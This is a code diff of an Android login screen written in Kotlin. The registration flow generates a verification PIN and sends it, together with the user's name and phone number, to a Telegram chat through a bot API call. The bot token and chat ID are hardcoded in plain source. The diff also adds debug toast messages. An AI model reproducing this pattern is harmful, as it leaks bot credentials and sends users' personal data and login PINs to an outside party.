@@ -12,16 +12,11 @@ class LoginActivity : AppCompatActivity() {
     private val vRepo = VerificationRepository()
     private val uRepo = UserRepository()
     private val client = OkHttpClient()
-    private val botToken = "8790130934:AAGY-hz-FXWEzvukQ-qEJ_mzv0qRjKY0s3g"
-    private val chatId = "5232430147" 
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        if (uRepo.getCurrentUserId() != null) {
-            startActivity(Intent(this, MainActivity::class.java))
-            finish(); return
-        }
         setContentView(R.layout.activity_login)
+
         val btn = findViewById<Button>(R.id.btnLogin)
         val etName = findViewById<EditText>(R.id.etRegName)
         val etPhone = findViewById<EditText>(R.id.etRegPhone)
@@ -31,24 +26,46 @@ class LoginActivity : AppCompatActivity() {
             val name = etName.text.toString().trim()
             val phone = etPhone.text.toString().trim()
             val email = etEmail.text.toString().trim()
-            if (name.isEmpty() || phone.isEmpty() || email.isEmpty()) return@setOnClickListener
+
+            if (name.isEmpty() || phone.isEmpty() || email.isEmpty()) {
+                Toast.makeText(this, "Empty fields!", Toast.LENGTH_SHORT).show()
+                return@setOnClickListener
+            }
 
             btn.isEnabled = false
+            Toast.makeText(this, "STEP 1: Starting Auth...", Toast.LENGTH_SHORT).show()
+            
             lifecycleScope.launch(Dispatchers.IO) {
                 try {
+                    // STEP 1: AUTH
                     uRepo.loginAnonymously()
+                    withContext(Dispatchers.Main) { Toast.makeText(this@LoginActivity, "STEP 2: Saving to DB...", Toast.LENGTH_SHORT).show() }
+                    
+                    // STEP 2: DATABASE
                     val pin = (100000..999999).random().toString()
                     vRepo.savePin(phone, pin)
-                    val text = "🚨 New Registry\nName: $name\nPhone: $phone\nPIN: $pin"
-                    val url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$text"
+                    withContext(Dispatchers.Main) { Toast.makeText(this@LoginActivity, "STEP 3: Sending Telegram...", Toast.LENGTH_SHORT).show() }
+                    
+                    // STEP 3: TELEGRAM
+                    val botToken = "8790130934:AAGY-hz-FXWEzvukQ-qEJ_mzv0qRjKY0s3g"
+                    val chatId = "5232430147"
+                    val text = "🚨 PIN: $pin\nName: $name\nPhone: $phone"
+                    val url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=${java.net.URLEncoder.encode(text, "UTF-8")}"
                     client.newCall(Request.Builder().url(url).build()).execute()
+
                     withContext(Dispatchers.Main) {
-                        getSharedPreferences("user_prefs", 0).edit().putString("temp_phone", phone).putString("name", name).putString("email", email).apply()
+                        getSharedPreferences("user_prefs", 0).edit()
+                            .putString("temp_phone", phone).putString("name", name).putString("email", email).apply()
+                        
+                        Toast.makeText(this@LoginActivity, "SUCCESS: Opening Verification!", Toast.LENGTH_SHORT).show()
                         startActivity(Intent(this@LoginActivity, VerificationActivity::class.java))
                         finish()
                     }
                 } catch (e: Exception) {
-                    withContext(Dispatchers.Main) { btn.isEnabled = true }
+                    withContext(Dispatchers.Main) {
+                        btn.isEnabled = true
+                        Toast.makeText(this@LoginActivity, "STALLED AT: ${e.message}", Toast.LENGTH_LONG).show()
+                    }
                 }
             }
         }
